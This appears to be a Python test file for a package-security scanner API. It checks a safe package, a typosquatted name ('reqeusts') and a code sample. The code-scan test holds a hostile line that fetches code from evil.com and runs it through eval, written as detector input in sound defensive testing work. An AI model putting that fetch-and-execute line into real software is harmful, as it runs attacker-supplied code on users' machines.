import asyncio
import aiohttp
import pytest

async def test_api():
    async with aiohttp.ClientSession() as session:
        # Test 1: Safe package
        print("\nTesting safe package (requests)...")
        async with session.post('http://localhost:8000/api/v1/check-package', 
            json={
                "name": "requests",
                "ecosystem": "pypi"
            }) as response:
            result = await response.json()
            print("Result:", result)
            assert response.status == 200

        # Test 2: Suspicious package
        print("\nTesting suspicious package (reqeusts)...")
        async with session.post('http://localhost:8000/api/v1/check-package', 
            json={
                "name": "reqeusts",  # Typo!
                "ecosystem": "pypi"
            }) as response:
            result = await response.json()
            print("Result:", result)
            assert result["is_suspicious"] == True

        # Test 3: Malicious code
        print("\nTesting malicious code...")
        async with session.post('http://localhost:8000/api/v1/scan-code', 
            json={
                "code": "eval(requests.get('http://evil.com/code.py').text)"
            }) as response:
            result = await response.json()
            print("Result:", result)
            assert result["is_suspicious"] == True

if __name__ == "__main__":
    asyncio.run(test_api()) 